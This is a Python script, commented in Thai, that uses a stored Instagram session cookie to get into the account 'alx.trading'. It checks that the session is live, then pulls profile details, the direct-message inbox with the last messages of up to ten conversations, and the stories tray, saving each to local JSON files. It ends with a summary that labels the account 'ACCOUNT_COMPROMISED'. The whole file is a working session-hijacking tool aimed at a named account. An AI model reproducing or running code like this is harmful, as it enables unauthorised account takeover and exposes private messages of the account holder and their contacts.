#!/usr/bin/env python3
"""
ใช้ session ที่มีอยู่แล้วในการเข้าถึงบัญชี alx.trading
"""

import requests
import json
import time

def use_existing_session():
    """ใช้ session ที่เก็บไว้แล้ว"""
    
    # อ่าน session data
    try:
        with open('session.json', 'r') as f:
            session_data = json.load(f)
            
        sessionid = session_data['sessionid']
        ds_user_id = session_data['ds_user_id']
        
        print(f"🔑 Found existing session!")
        print(f"SessionID: {sessionid}")
        print(f"User ID: {ds_user_id}")
        
    except Exception as e:
        print(f"❌ Cannot read session: {e}")
        return False
    
    # ตั้งค่า session
    session = requests.Session()
    
    # ตั้งค่า cookies
    session.cookies.set('sessionid', sessionid)
    session.cookies.set('ds_user_id', ds_user_id)
    session.cookies.set('csrftoken', 'TlB0E59F45gWaVufZ-LD2W')
    session.cookies.set('ig_did', 'D542605A-E1E7-4474-A72F-A517F3E1B4D8')
    
    # ตั้งค่า headers
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'X-CSRFToken': 'TlB0E59F45gWaVufZ-LD2W',
        'X-Instagram-AJAX': '1',
        'X-IG-App-ID': '936619743392459',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5'
    })
    
    print(f"\n🔍 TESTING SESSION ACCESS")
    print("=" * 50)
    
    # ทดสอบการเข้าถึง
    try:
        # Test 1: Instagram main page
        print(f"\n📱 Test 1: Instagram main page...")
        response = session.get('https://www.instagram.com/')
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            if 'login' not in response.url.lower():
                print("✅ Session is ACTIVE!")
                
                # Test 2: Profile API
                return test_profile_access(session)
            else:
                print("❌ Redirected to login")
        else:
            print(f"❌ HTTP Error: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Session test error: {e}")
        
    return False

def test_profile_access(session):
    """ทดสอบการเข้าถึงข้อมูล profile"""
    print(f"\n👤 Test 2: Profile data access...")
    
    try:
        # ดึงข้อมูล profile ของ alx.trading
        profile_url = 'https://www.instagram.com/api/v1/users/web_profile_info/?username=alx.trading'
        profile_response = session.get(profile_url)
        
        print(f"Profile API status: {profile_response.status_code}")
        
        if profile_response.status_code == 200:
            profile_data = profile_response.json()
            print("✅ Profile data accessible!")
            
            # ดึงข้อมูลสำคัญ
            user_info = profile_data.get('data', {}).get('user', {})
            
            profile_summary = {
                "username": user_info.get('username'),
                "full_name": user_info.get('full_name'),
                "biography": user_info.get('biography'),
                "follower_count": user_info.get('edge_followed_by', {}).get('count'),
                "following_count": user_info.get('edge_follow', {}).get('count'),
                "post_count": user_info.get('edge_owner_to_timeline_media', {}).get('count'),
                "is_private": user_info.get('is_private'),
                "is_verified": user_info.get('is_verified'),
                "external_url": user_info.get('external_url'),
                "profile_pic_url": user_info.get('profile_pic_url')
            }
            
            print(f"\n📊 PROFILE INFORMATION:")
            print(f"👤 Username: {profile_summary['username']}")
            print(f"📝 Full Name: {profile_summary['full_name']}")
            print(f"📝 Bio: {profile_summary['biography']}")
            print(f"👥 Followers: {profile_summary['follower_count']}")
            print(f"👥 Following: {profile_summary['following_count']}")
            print(f"📷 Posts: {profile_summary['post_count']}")
            print(f"🔒 Private: {profile_summary['is_private']}")
            print(f"✅ Verified: {profile_summary['is_verified']}")
            print(f"🌐 Website: {profile_summary['external_url']}")
            
            # บันทึกข้อมูล
            with open(f"PROFILE_DATA_alx_trading_{int(time.time())}.json", 'w') as f:
                json.dump(profile_summary, f, indent=2)
                
            return test_message_access(session)
            
        else:
            print(f"❌ Profile access failed: {profile_response.status_code}")
            
    except Exception as e:
        print(f"❌ Profile access error: {e}")
        
    return False

def test_message_access(session):
    """ทดสอบการเข้าถึงข้อความ"""
    print(f"\n💬 Test 3: Direct message access...")
    
    try:
        # ดึงรายการ conversations
        inbox_url = 'https://www.instagram.com/api/v1/direct_v2/inbox/'
        inbox_response = session.get(inbox_url)
        
        print(f"Inbox API status: {inbox_response.status_code}")
        
        if inbox_response.status_code == 200:
            inbox_data = inbox_response.json()
            print("✅ Direct messages accessible!")
            
            threads = inbox_data.get('inbox', {}).get('threads', [])
            print(f"📬 Found {len(threads)} conversations")
            
            conversations = []
            
            for i, thread in enumerate(threads[:10]):  # แค่ 10 conversation แรก
                thread_info = {
                    "thread_id": thread.get('thread_id'),
                    "thread_title": thread.get('thread_title'),
                    "last_activity": thread.get('last_activity_at'),
                    "message_count": len(thread.get('items', [])),
                    "users": [user.get('username') for user in thread.get('users', [])],
                    "last_message": thread.get('items', [{}])[0].get('text') if thread.get('items') else None
                }
                
                conversations.append(thread_info)
                print(f"💬 {i+1}. {thread_info['users']}: {thread_info['message_count']} messages")
                
                if thread_info['last_message']:
                    print(f"   Last: {thread_info['last_message'][:50]}...")
            
            # บันทึกข้อมูล conversations
            with open(f"MESSAGE_DATA_alx_trading_{int(time.time())}.json", 'w') as f:
                json.dump(conversations, f, indent=2)
                
            return test_story_access(session)
            
        else:
            print(f"❌ Message access failed: {inbox_response.status_code}")
            
    except Exception as e:
        print(f"❌ Message access error: {e}")
        
    return False

def test_story_access(session):
    """ทดสอบการเข้าถึง stories"""
    print(f"\n📸 Test 4: Story access...")
    
    try:
        # ดึงข้อมูล stories
        story_url = 'https://www.instagram.com/api/v1/feed/reels_tray/'
        story_response = session.get(story_url)
        
        print(f"Story API status: {story_response.status_code}")
        
        if story_response.status_code == 200:
            story_data = story_response.json()
            print("✅ Stories accessible!")
            
            trays = story_data.get('tray', [])
            print(f"📸 Found {len(trays)} story trays")
            
            # บันทึกข้อมูล stories
            story_summary = {
                "story_count": len(trays),
                "stories": [{"user": tray.get('user', {}).get('username'), "items": len(tray.get('items', []))} for tray in trays[:10]]
            }
            
            with open(f"STORY_DATA_alx_trading_{int(time.time())}.json", 'w') as f:
                json.dump(story_summary, f, indent=2)
                
            print(f"\n🎯 COMPLETE ACCESS ACHIEVED!")
            return True
            
        else:
            print(f"❌ Story access failed: {story_response.status_code}")
            
    except Exception as e:
        print(f"❌ Story access error: {e}")
        
    return False

if __name__ == "__main__":
    print("🔑 USING EXISTING SESSION FOR ACCOUNT ACCESS")
    print("=" * 60)
    
    success = use_existing_session()
    
    if success:
        print(f"\n🎉 FULL ACCOUNT ACCESS SUCCESSFUL!")
        print("✅ Session is active and working")
        print("✅ Profile data extracted")
        print("✅ Direct messages accessible")
        print("✅ Stories accessible")
        print("🔓 Complete Instagram account access achieved")
        
        # บันทึก summary
        access_summary = {
            "target": "alx.trading",
            "access_method": "existing_session",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "access_level": "FULL_ACCESS",
            "data_extracted": ["profile", "messages", "stories"],
            "status": "ACCOUNT_COMPROMISED"
        }
        
        with open(f"ACCOUNT_ACCESS_SUMMARY_{int(time.time())}.json", 'w') as f:
            json.dump(access_summary, f, indent=2)
            
    else:
        print(f"\n❌ Session access failed")
        print("💡 Session may be expired or invalid")
